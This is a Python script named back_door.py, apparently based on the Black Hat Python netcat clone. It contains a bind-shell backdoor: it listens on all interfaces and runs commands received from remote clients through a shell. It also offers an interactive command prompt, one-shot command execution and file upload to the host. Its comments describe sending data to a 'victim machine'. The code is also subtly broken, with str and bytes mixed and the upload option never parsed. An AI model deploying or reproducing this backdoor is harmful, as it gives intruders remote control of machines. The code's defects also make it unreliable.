#!/usr/bin/env python3
# -*- coding:utf-8 -*-
# author: bigfoolliu


import sys
import socket
import threading
import subprocess
import getopt


listen = False
command = False
upload = False

execute = ''
target = ''
upload_destination = ''
port = 0


def usage():
    print('BHP Net Tool')
    print('Usage: back_door.py -t target_port -p port')


def client_sender(buffer):
    """向受害者机器发送数据"""
    global target
    global port
    client = socket.socket(family=socket.AF_INET, type=socket.SOCK_STREAM)
    try:
        client.connect((target, port))
        if len(buffer):
            client.send(buffer)
        while True:
            recv_len = 1
            response = ''
            while recv_len:
                data = client.recv(4096)
                recv_len = len(data)
                response += data

                if recv_len < 4096:
                    break

            print(f'response:{response}')

            buffer = input('')
            buffer += '\n'
            client.send(bytes(buffer))
    except Exception as e:
        print(f'exception: {e}')
        print('closed')
        client.close()


def server_loop():
    """监听"""
    global target
    global port
    if not len(target):
        target = '0.0.0.0'

    server = socket.socket(family=socket.AF_INET, type=socket.SOCK_STREAM)
    server.bind((target, port))
    server.listen(5)

    while True:
        client_socket, addr = server.accept()
        client_thread = threading.Thread(target=client_handler, args=(client_socket,))
        client_thread.start()


def client_handler(client_socket):
    global upload_destination
    global upload
    global command

    if len(upload_destination):
        file_buffer = ''
        while True:
            data = client_socket.recv(1024)
            if not data:
                break
            else:
                file_buffer += data
        try:
            with open(upload_destination, 'wb') as f:
                f.write(bytes(file_buffer))
            client_socket.send(f'success saved file to {upload_destination}')
        except Exception as e:
            print(f'save file to {upload_destination} failed: {e}')
            return
    if len(execute):
        output = run_command(execute)
        client_socket.send(output)

    if command:
        while True:
            client_socket.send(b'<BHP:#>')
            cmd_buffer = ''
            while '\n' not in cmd_buffer:
                cmd_buffer += client_socket.recv(1024).decode('utf-8')
            response = run_command(cmd_buffer)
            client_socket.send(response)


def run_command(cmd):
    """运行命令行命令"""
    _command = cmd.rstrip()
    try:
        output = subprocess.check_output(_command, stderr=subprocess.STDOUT, shell=True)
    except Exception as e:
        print(f'run command exception: {e}')
        return
    return output


def main():
    global listen
    global execute
    global target
    global port
    global upload_destination
    global command

    if not len(sys.argv[1:]):
        usage()

    try:
        opts, args = getopt.getopt(args=sys.argv[1:], shortopts='hle:t:p:cu', longopts=
        ['help', 'listen', 'execute', 'target', 'port', 'command', 'upload'])
    except getopt.GetoptError as e:
        print(e)
        usage()
        return

    for o, a in opts:
        if o in ['h', '--help']:
            usage()
        elif o in ['-l', '--listen']:
            listen = True
        elif o in ['-e', '--execute']:
            execute = a
        elif o in ['-c', '--commandshell']:
            command = True
        elif o in ['-t', '--target']:
            target = a
        elif o in ['-p', '--port']:
            port = int(a)
        else:
            assert False, 'Unhandled option'

    # 从标准中获取输入数据
    if not listen and len(target) and port > 0:
        buffer = sys.stdin.read()
        client_sender(buffer)

    # 监听
    if listen:
        server_loop()


if __name__ == '__main__':
    main()
